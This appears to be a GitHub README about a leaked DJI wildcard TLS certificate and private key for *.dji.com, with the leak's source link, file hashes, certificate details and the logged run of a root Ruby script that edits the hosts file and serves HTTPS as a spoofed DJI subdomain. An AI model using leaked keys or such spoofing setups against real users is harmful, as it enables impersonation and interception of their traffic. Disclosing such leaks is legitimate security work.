# DJI-Unobtanium
"a highly desirable material that is hypothetical, scientifically impossible, extremely rare, costly, or fictional, or has some of these properties in combination."

A DJI dev unfortunately left a copy of the production SSL cert on a public GitHub repo. This cert was originally obtained from:
https://github.com/lizhanbin/real_time_serve_v1/blob/master/cert/

MD5 (dji_com.crt) = c25e14b10cd8cabc5f0e77e69a22835b
MD5 (dji_com.key) = c77b748a6e768dd665dda8cf9b335dfb

```
$ openssl x509 -in dji_com.crt -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            5a:e6:da:8b:0d:b8:f0:1f:04:f6:3b:fb
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=BE, O=GlobalSign nv-sa, CN=AlphaSSL CA - SHA256 - G2
        Validity
            Not Before: Jun  4 10:00:32 2017 GMT
            Not After : Jun  5 10:00:32 2018 GMT
        Subject: OU=Domain Control Validated, CN=*.dji.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
            RSA Public Key: (2048 bit)
                Modulus (2048 bit):
                    00:f9:52:eb:9b:4c:fa:9d:10:5b:64:bc:88:47:6c:
                    bf:7d:f6:69:4e:9d:c5:3b:13:d7:75:09:30:a5:97:
                    35:0f:b2:8d:d7:a3:a2:96:1f:27:4a:f9:80:c6:0a:
...
```
```
$ sudo ruby Unobtanium.rb 
Password:
Running as root... thanks!
Original Gangsters are already in your hosts file
[2017-09-02 23:17:16] INFO  WEBrick 1.3.1
[2017-09-02 23:17:16] INFO  ruby 2.2.7 (2017-03-28) [x86_64-darwin16]
[2017-09-02 23:17:16] INFO  
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            5a:e6:da:8b:0d:b8:f0:1f:04:f6:3b:fb
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=BE, O=GlobalSign nv-sa, CN=AlphaSSL CA - SHA256 - G2
        Validity
            Not Before: Jun  4 10:00:32 2017 GMT
            Not After : Jun  5 10:00:32 2018 GMT
        Subject: OU=Domain Control Validated, CN=*.dji.com
...
[2017-09-02 23:18:02] ERROR not found.
localhost - - [02/Sep/2017:23:18:02 EDT] "GET / HTTP/1.1" 404 296
- -> /
...
```

This quick test shows we can now spoof "https://*.dji.com" and our brower will be happy none the wiser! 
<img src="https://github.com/MAVProxyUser/DJI-Unobtanium/raw/master/OGSSL.jpg">

Here we used https://originalgangsters.dji.com

The internet can't agree on the spelling... but one thing is for sure, this shit is IMPOSSIBLE to get ahold of. 
<img src="https://github.com/MAVProxyUser/DJI-Unobtanium/raw/master/Unobtanium.jpg">
